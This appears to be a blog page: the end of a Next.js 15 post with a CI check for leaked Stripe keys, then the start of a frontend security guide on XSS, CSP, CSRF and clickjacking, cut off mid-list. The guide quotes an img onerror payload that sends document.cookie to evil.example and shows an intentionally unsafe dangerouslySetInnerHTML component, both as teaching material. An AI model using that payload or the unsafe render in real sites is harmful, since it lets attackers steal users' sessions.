&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;Suspense&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;UserProfile&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;fetchUser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;PostsList&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;posts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;fetchPosts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;ul&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;posts&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;li&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/li&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;)&lt;/span&gt;&lt;span class="sr"&gt;}&amp;lt;/u&lt;/span&gt;&lt;span class="nx"&gt;l&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;DashboardPage&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;params&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Suspense&lt;/span&gt; &lt;span class="nx"&gt;fallback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;skeleton h-12 w-48&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;UserProfile&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/Suspense&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Suspense&lt;/span&gt; &lt;span class="nx"&gt;fallback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;skeleton h-64&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;PostsList&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/Suspense&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next.js 15 will:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Stream the shell HTML immediately.&lt;/li&gt;
&lt;li&gt;Start both &lt;code&gt;fetchUser&lt;/code&gt; and &lt;code&gt;fetchPosts&lt;/code&gt; &lt;strong&gt;in parallel&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Replace each Suspense boundary as data arrives.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Result: LCP improves by 40-60% because the skeleton UI paints instantly.&lt;/p&gt;

&lt;h2&gt;


War Story: The Bundle Audit That Saved Us
&lt;/h2&gt;

&lt;p&gt;After the Stripe key leak, I added a CI check:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# .github/workflows/bundle-audit.yml&lt;/span&gt;
- run: npm run build
- run: |
&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="nb"&gt;grep&lt;/span&gt; &lt;span class="nt"&gt;-r&lt;/span&gt; &lt;span class="s2"&gt;"sk_live_"&lt;/span&gt; .next/static/chunks&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then
&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"Secret key found in client bundle!"&lt;/span&gt;
&lt;span class="nb"&gt;exit &lt;/span&gt;1
&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Caught three more leaks before they hit production.&lt;/p&gt;

&lt;h2&gt;


Takeaways
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Never define Server Actions in &lt;code&gt;'use client'&lt;/code&gt; files.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Validate inputs with Zod&lt;/strong&gt; before touching external APIs.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Guard every action with session checks.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Use granular Suspense&lt;/strong&gt; to parallelize data fetching and improve LCP.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Audit your bundles&lt;/strong&gt; in CI to catch secret leaks.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Next.js 15 gives you the primitives. It's on you to wire them correctly.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;⚡ &lt;strong&gt;TL;DR:&lt;/strong&gt; Frontend engineers own real browser-side attacks: XSS, CSRF, clickjacking, supply chain. The core defense is never trusting input, with &lt;strong&gt;CSP&lt;/strong&gt; as your safety net for the escape you missed and secure cookies to prove a request is genuine.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;


Contents
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;A comment field that ran code in every visitor's browser&lt;/li&gt;
&lt;li&gt;The one principle behind all of it&lt;/li&gt;
&lt;li&gt;The picture: from untrusted input to a safe page&lt;/li&gt;
&lt;li&gt;The four threats at a glance&lt;/li&gt;
&lt;li&gt;XSS: the difference is one render call&lt;/li&gt;
&lt;li&gt;CSP: the safety net for the escape you missed&lt;/li&gt;
&lt;li&gt;Cookies and CSRF: prove the request is really yours&lt;/li&gt;
&lt;li&gt;Supply chain: the attacker who never touched your code&lt;/li&gt;
&lt;li&gt;Common mistakes that ship to production&lt;/li&gt;
&lt;li&gt;Takeaways&lt;/li&gt;
&lt;li&gt;Where to go next&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;


A comment field that ran code in every visitor's browser
&lt;/h2&gt;

&lt;p&gt;A side project I shipped had a public comments section. Plain textarea, save the string, render it back on the page. It worked beautifully, until someone posted a comment that was not text. It was &lt;code&gt;&amp;lt;img src=x onerror="fetch('https://evil.example/c?'+document.cookie)"&amp;gt;&lt;/code&gt;. The browser tried to load the broken image, the &lt;code&gt;onerror&lt;/code&gt; handler fired, and every single person who opened that page silently shipped their session cookie to a server I did not control. I had not written a single line of malicious code. I just rendered a string the way I render every other string.&lt;/p&gt;

&lt;p&gt;That is the whole game. Most frontend security bugs are not exotic, they are the default behavior of the browser doing exactly what you told it to. This article walks the threats a frontend engineer is on the hook for: &lt;strong&gt;XSS&lt;/strong&gt;, &lt;strong&gt;CSRF&lt;/strong&gt;, &lt;strong&gt;clickjacking&lt;/strong&gt;, &lt;strong&gt;Content Security Policy&lt;/strong&gt;, &lt;strong&gt;secure cookie flags&lt;/strong&gt;, and &lt;strong&gt;supply-chain risk&lt;/strong&gt; in your bundle. Not theory, the concrete defense for each.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;📌 &lt;strong&gt;Who this is for:&lt;/strong&gt; Frontend engineers who can build a React/TypeScript app but have never been the person responsible when a pen-test report lands. If you have ever typed &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; and felt a small flicker of doubt, this is for you. No prior security background assumed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;


The one principle behind all of it
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The browser runs whatever code ends up on the page, make sure it's only yours.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Every threat below is a variation on a single failure: code or actions you did not author end up executing with your user's identity, on your origin. XSS is attacker code running as your page. CSRF is the attacker borrowing your user's logged-in session. Clickjacking is the attacker borrowing your user's clicks. Supply chain is attacker code arriving inside a dependency you trusted. Once you see it as "whose code is this, and who is it acting as," the defenses stop feeling like a random checklist.&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;In the real world&lt;/th&gt;
&lt;th&gt;In tech&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;A bouncer who frisks everyone at the door&lt;/td&gt;
&lt;td&gt;Escaping / sanitizing all untrusted input before it renders&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;A guest list of who is allowed to perform on stage&lt;/td&gt;
&lt;td&gt;Content Security Policy, only these script sources may run&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;An ID check before honoring a member's request&lt;/td&gt;
&lt;td&gt;CSRF tokens + SameSite cookies, prove the request came from your app&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Frosted glass so nobody can trick a member into signing through it&lt;/td&gt;
&lt;td&gt;Frame-busting headers against clickjacking&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Frontend security mapped to a building you let the public into.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;


The picture: from untrusted input to a safe page
&lt;/h2&gt;

&lt;p&gt;Two streams of untrusted material flow toward your page: data your users type, and third-party scripts you pull in. Each defense sits between a source and the rendered page. Trace one flow through this and the rest of the article is just detail.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fmermaid.ink%2Fimg%-IG5fY3NwCiAgbl9lc2NhcGUgLS0-IG5fcGFnZQogIG5fY3NwIC0tPiBuX3BhZ2UKICBuX3NhbWVzaXRlIC0uLT58InRydXN0ZWQgYWN0aW9uInwgbl9wYWdl%3FbgColor%3D0d1017%26type%3Dpng" class="article-body-image-wrapper"&gt;&lt;img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fmermaid.ink%2Fimg%-IG5fY3NwCiAgbl9lc2NhcGUgLS0-IG5fcGFnZQogIG5fY3NwIC0tPiBuX3BhZ2UKICBuX3NhbWVzaXRlIC0uLT58InRydXN0ZWQgYWN0aW9uInwgbl9wYWdl%3FbgColor%3D0d1017%26type%3Dpng" alt="Untrusted input and third-party code pass through layered defenses before anything renders or executes." width="801" height="367"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Untrusted input and third-party code pass through layered defenses before anything renders or executes.&lt;/em&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;strong&gt;Input arrives untrusted&lt;/strong&gt;: A comment, a URL query param, a profile name, treat every byte the user controls as potentially hostile, even from logged-in users.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Escape on output&lt;/strong&gt;: When you render it, the framework turns &lt;code&gt;&amp;lt;&lt;/code&gt; into &lt;code&gt;&amp;amp;lt;&lt;/code&gt; so it shows as text. The attack string becomes harmless characters on the screen instead of a live tag.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;CSP backstops you&lt;/strong&gt;: Even if one escape is missed, a Content-Security-Policy header tells the browser to refuse any inline or off-allowlist script, so the injected code never runs.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Cookies prove identity safely&lt;/strong&gt;: SameSite + Secure + HttpOnly flags mean session cookies travel only on same-site requests over HTTPS and cannot be read by script, defanging both CSRF and cookie theft.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Only your code reaches the page&lt;/strong&gt;: What renders is text you intended and scripts you allowlisted. Nothing the attacker supplied executes with your origin's authority.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;


The four threats at a glance
&lt;/h2&gt;

&lt;p&gt;Before the code, here is the map. Memorize the &lt;strong&gt;defense&lt;/strong&gt; column, that is your job description.&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Threat&lt;/th&gt;
&lt;th&gt;What it is&lt;/th&gt;
&lt;th&gt;Defense&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;XSS&lt;/td&gt;
&lt;td&gt;Attacker-supplied script runs as your page, with access to the DOM, cookies, and your user's session.&lt;/td&gt;
&lt;td&gt;Render untrusted data as text (auto-escaping); sanitize HTML; never feed user data to &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt;; add CSP as backstop.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CSRF&lt;/td&gt;
&lt;td&gt;A malicious site triggers an authenticated request to your app using the victim's logged-in cookies.&lt;/td&gt;
&lt;td&gt;
&lt;code&gt;SameSite=Lax/Strict&lt;/code&gt; cookies + anti-CSRF token (double-submit or synchronizer) on state-changing requests.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clickjacking&lt;/td&gt;
&lt;td&gt;Your page is loaded in an invisible iframe over a decoy, so the victim's clicks hit your UI unknowingly.&lt;/td&gt;
&lt;td&gt;
&lt;code&gt;Content-Security-Policy: frame-ancestors 'none'&lt;/code&gt; (or &lt;code&gt;X-Frame-Options: DENY&lt;/code&gt;) to forbid framing.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Supply chain&lt;/td&gt;
&lt;td&gt;Malicious or compromised code ships inside an npm dependency and ends up in your bundle.&lt;/td&gt;
&lt;td&gt;Lockfiles + &lt;code&gt;npm audit&lt;/code&gt;, pin &amp;amp; review deps, Subresource Integrity for CDN scripts, and CSP to limit what they can reach.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;The browser-side threats a frontend engineer owns, and the primary defense for each.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;


XSS: the difference is one render call
&lt;/h2&gt;

&lt;p&gt;XSS (cross-site scripting) is the big one, and it is almost always self-inflicted. React, Vue, Angular all escape interpolated values by default, &lt;code&gt;{userComment}&lt;/code&gt; in JSX renders the literal characters, so the attack from the intro becomes inert text. You only lose that protection when you go out of your way to bypass it. The single most dangerous escape hatch in React is &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt;. The name is a warning, not a dare.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Comment.tsx&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight tsx"&gt;&lt;code&gt;&lt;span class="c1"&gt;// UNSAFE, renders the string as live HTML.&lt;/span&gt;
&lt;span class="c1"&gt;// If `comment` contains &amp;lt;img onerror=...&amp;gt;, the browser executes it.&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;CommentUnsafe&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;comment&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;comment&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;dangerouslySetInnerHTML&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;__html&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;comment&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// SAFE, JSX escapes the value, so it renders as plain text.&lt;/span&gt;
&lt;span class="c1"&gt;// &amp;lt;img onerror=...&amp;gt; shows up as visible characters, never runs.&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;Comment&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;comment&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;comment&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;comment&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// If you GENUINELY need to render user HTML (rich-text editor output),&lt;/span&gt;
&lt;span class="c1"&gt;// sanitize first with a vetted library, never trust raw input.&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;DOMPurify&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;dompurify&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;RichComment&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;html&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;html&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;clean&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;DOMPurify&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;sanitize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;dangerouslySetInnerHTML&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;__html&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;clean&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The rule: &lt;strong&gt;default to text rendering.&lt;/strong&gt; Reach for raw HTML only when a product requirement forces it (a WYSIWYG editor, sanitized markdown), and when you do, run it through a maintained sanitizer like DOMPurify &lt;em&gt;every time&lt;/em&gt;, not just once at save. This is the same vulnerability class covered server-side in &lt;a href="https://thesimplifiedtech.com/blog/preventing-injection-attacks-sqli-xss" rel="noopener noreferrer"&gt;Preventing Injection Attacks&lt;/a&gt;, the input is hostile at every layer.&lt;/p&gt;

&lt;h2&gt;


CSP: the safety net for the escape you missed
&lt;/h2&gt;

&lt;p&gt;Auto-escaping is your primary defense, but you are human and apps are large. Content Security Policy is the backstop: an HTTP response header that tells the browser which sources of script, style, and other content are allowed to execute. With a strict CSP, even a successful injection fails, the browser simply refuses to run an inline &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; or load code from a domain you did not allowlist.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;CSP response header&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="c"&gt;&amp;lt;!-- Sent as an HTTP header on every HTML response. --&amp;gt;&lt;/span&gt;
Content-Security-Policy:
default-src 'self';
script-src 'self' https://cdn.trusted.example;
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
connect-src 'self' https://api.yourapp.example;
frame-ancestors 'none';
object-src 'none';
base-uri 'self'

&lt;span class="c"&gt;&amp;lt;!-- script-src 'self' = only scripts from your own origin run.
No inline &amp;lt;script&amp;gt; executes, no eval(), no injected handlers.
frame-ancestors 'none' also kills clickjacking in one line. --&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note &lt;code&gt;frame-ancestors 'none'&lt;/code&gt;, that single directive is your clickjacking defense too. It tells browsers no site may load your page in a frame, so an attacker cannot overlay your UI under a decoy. Start CSP in &lt;code&gt;Content-Security-Policy-Report-Only&lt;/code&gt; mode to see what would break, fix the violations, then enforce. Avoid &lt;code&gt;'unsafe-inline'&lt;/code&gt; for scripts, it defeats most of the point.&lt;/p&gt;

&lt;h2&gt;


Cookies and CSRF: prove the request is really yours
&lt;/h2&gt;

&lt;p&gt;CSRF (cross-site request forgery) abuses the fact that browsers attach your cookies to requests automatically. If you are logged into your bank and visit a malicious page, a hidden form there can POST to the bank, and the browser helpfully includes your session cookie. The fix lives in how you set the cookie and how you verify the request.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
